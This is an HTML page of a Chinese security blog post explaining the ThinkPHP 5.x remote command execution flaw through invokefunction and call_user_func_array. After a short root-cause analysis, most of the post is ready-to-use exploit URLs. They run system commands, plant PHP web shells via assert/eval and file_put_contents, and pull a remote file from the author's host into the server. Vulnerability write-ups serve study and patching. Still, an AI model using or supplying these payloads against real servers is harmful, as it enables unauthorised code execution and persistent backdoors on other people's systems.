@@ -1,0 +1,154 @@
+<!doctype html>
+<html lang="en">
+    <head><meta name="generator" content="Hexo 3.9.0">
+		
+        <meta http-equiv="Content-Type" content="text/html" charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+        <meta name="description" content>
+        <meta name="keywords" content>
+        <meta name="HandheldFriendly" content="True">
+        <meta name="MobileOptimized" content="320">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="shortcut icon" href="/img/avatar.jpg">
+        <link rel="alternate" type="application/rss+xml" title="Wiley" href="/atom.xml">
+        <title>ThinkPHP5远程命令执行漏洞 | Wiley的部落格小黑屋</title>
+        <meta name="description" content="{{meta_description}}">
+        <link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css">
+        <link rel="stylesheet" type="text/css" href="/styles/crisp.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+    </head>
+    
+		<body class="post-template">
+	
+
+        <header id="header">
+            <a id="logo" href="/"><img src="/img/avatar.jpg" alt="Wiley的部落格小黑屋"></a>
+            <h1 class="center"><a href="/">Wiley</a></h1>
+            <p class="center">信息安全爱好者，未来的CTFer，喜欢写小工具。</p>
+            <span id="follow-icons">
+      <a href="http://github.com/Wileysec"><i class="fa fa-github-square fa-2x"></i></a>
+        <a href="mailto:wileysec@qq.com"><i class="fa fa-envelope-square fa-2x"></i></a>
+            <a href="/atom.xml"><i class="fa fa-rss-square fa-2x"></i></a>
+  </span>
+
+<h6 class="links">
+  <a href="/About">About</a>
+  <a href="/Links">Links</a>
+</h6>
+        </header>
+
+        <main id="content">
+        
+
+<article class="post">
+  December 15, 2018
+  
+
+  <h1 class="post-title">ThinkPHP5远程命令执行漏洞</h1>
+  <section class="post-content article-entry">
+    <p>本文将讲述最近的ThinkPHP5远程命令执行漏洞和一些getshell技巧，还有一些POC的总结。</p>
+<a id="more"></a>
+
+<p>该漏洞在10号晚上就已经大量公布了，我这个文章发的比较晚，没有及时同步到博客上。</p>
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>ThinkPHP 5.x(5.0.23-&gt;5.1.31) 远程命令执行漏洞Getshell</p>
+<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>在没有使用ThinkPHP的Pathinfo模式下访问：<a href="http://localhost/public/index.php?s=index/\\think/Container/invokeFunction" target="_blank" rel="noopener">http://localhost/public/index.php?s=index/\\think/Container/invokeFunction</a></p>
+<p>没有使用pathinfo模式的时候，就会将<code>think</code>作为一个控制器，<code>Container</code>作为一个函数去执行</p>
+<p><img src="https://www.wileysec.com/usr/uploads/2019/01/1395307544.jpg" alt="1.jpg"></p>
+<p>当然，<code>think</code>是一个命名空间。调用<code>Container</code>类当然是需要这样写了<code>/\think/Container</code></p>
+<p>来看看ThinkPHP是怎么加载控制器的，这个函数在App类中</p>
+<p><img src="https://www.wileysec.com/usr/uploads/2019/01/986489204.jpg" alt="2.jpg"></p>
+<p>再跟踪到<code>Container</code>这个类中，在ThinkPHP运行的时候就会被加载。实例化控制器就会实例化这个类，然后再去调用<code>invokefunction</code>这个函数。</p>
+<p><img src="https://www.wileysec.com/usr/uploads/2019/01/1750714569.jpg" alt="3.jpg"></p>
+<p><code>invokefunction</code>函数中有两个参数，第一个是函数名，第二个是 <strong>第一个参数</strong>中执行函数的参数。</p>
+<p>如果我们传入<code>function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=123</code></p>
+<p><code>call_user_func_array</code> 调用回调函数，并把一个数组参数作为回调函数的参数.</p>
+<p>此时就相当于执行了<code>var_dump(123)</code></p>
+<p>就可以成功执行了var_dump这个函数，并输出了<code>string(3) &quot;123&quot;</code></p>
+<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p><img src="https://www.wileysec.com/usr/uploads/2019/01/1575998866.jpg" alt="1.jpg"></p>
+<p>Payload：<code>?s=index/think\container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=var_dump&amp;vars[1][]=123</code></p>
+<p>可以看到构造的Payload成功执行了var_dump函数，造成了代码执行漏洞。</p>
+<p><img src="https://www.wileysec.com/usr/uploads/2019/01/2744798721.jpg" alt="2.jpg"></p>
+<p>将var_dump换成phpinfo，第二个参数有值就可以，成功执行了<code>phpinfo</code>这个函数。</p>
+<p>能够代码执行，是否能够命令执行？</p>
+<p><img src="https://www.wileysec.com/usr/uploads/2019/01/2005255445.jpg" alt="3.jpg"></p>
+<p>将数组第一个参数设置为<code>system</code>，第二个参数设置为<code>ipconfig</code>也成功命令执行了。</p>
+<p>目测ThinkPHP5.1以下版本可以直接getshell，由于本环境使用的最新版的ThinkPHP5.1版本，可能写入不了文件。</p>
+<p>Getshell的Payload：<br><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=phpinfo();</code></p>
+<p><code>?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=@eval($_GET[&#39;fuck&#39;]);&amp;fuck=eval($_POST[ian]);</code></p>
+<p><code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo%20%27&lt;?php%20phpinfo();?&gt;%27%20&gt;%20info.php</code></p>
+<p><code>?s=/index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=file_put_contents&amp;vars[1][]=info.php&amp;vars[1][]=%3C?php%20phpinfo();?%3E</code></p>
+<p><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=assert&amp;vars[1][]=print_r(file_put_contents(%27xx.php%27,file_get_contents(%27http://www.wileysec.com/x.txt%27)))</code></p>
+
+  </section>
+  <footer class="post-footer">
+    <!--
+    <section class="author">
+      <h4>Wiley</h4>
+      <p></p>
+    </section>
+    -->
+  </footer>
+</article>
+
+<nav class="pagination" role="pagination">
+    
+    <a class="older-posts float-left" href="/2018/11/04/Meterpreter使用笔记/">
+        &laquo; Meterpreter使用笔记
+    </a>
+    
+    
+    <a class="newer-posts float-right" href="/2018/12/20/DedeCMS_V5.7_SP2_前台文件上传漏洞/">
+        DedeCMS V5.7 SP2 前台文件上传漏洞 &raquo;
+    </a>
+    
+    <div class="clear-both"></div>
+</nav>
+
+<!-- Table of Contents -->
+<div class="full-toc">
+    <button class="post-toc-menu">TOC</button>
+<div class="post-toc">
+	<span class="post-toc-title">文章目录</span>
+    <div class="post-toc-content">
+    	
+    </div>
+</div>
+<script>
+	$('.post-toc-menu').click(function(){
+		if($('.post-toc').hasClass('open')){
+			$('.post-toc').removeClass('open');
+		}else{
+			$('.post-toc').addClass('open');
+		}
+	});
+</script>
+</div>
+
+<script>
+    $(".post-content p").each(function(){
+      imglength = $(this).find('img').length;
+      for(i=0;i<imglength;i++){
+           obj = $(".post-content p img")[i];
+           aobj = $(obj).wrap("<a data-fancybox='gallery' no-pjax='' data-type='image' href='' id='fancybox" + i + "'></a>");
+           imghref = $(aobj).attr('src');
+           $('#fancybox' + i).attr('href',imghref);
+        }
+    });
+</script>
+
+
+        </main>
+        <footer id="footer">
+            <section id="footer-message">&copy; 2019 <a href="https://wileysec.github.io">Wiley</a> Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.</section>
+        </footer>
+    </body>
+</html>
+
+
